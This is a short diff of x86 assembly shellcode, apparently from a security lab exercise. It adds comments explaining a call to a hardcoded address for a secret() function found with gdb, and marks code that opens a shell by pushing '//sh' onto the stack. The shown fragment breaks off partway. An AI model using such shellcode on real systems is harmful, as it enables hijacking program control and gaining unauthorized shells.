@@ -2,8 +2,12 @@ section .text
   global _start
     _start:
       ; Store the argument string on stack
+      ;  the following two lines represent a call  to secret()
+      ; 0x565562e5 represents the address of secret() which we had to figure out using gdb
       mov ebx, 0x565562e5
       call ebx
+
+      ; code to open a shell
       xor  eax, eax 
       push eax          ; Use 0 to terminate the string
       push "//sh"
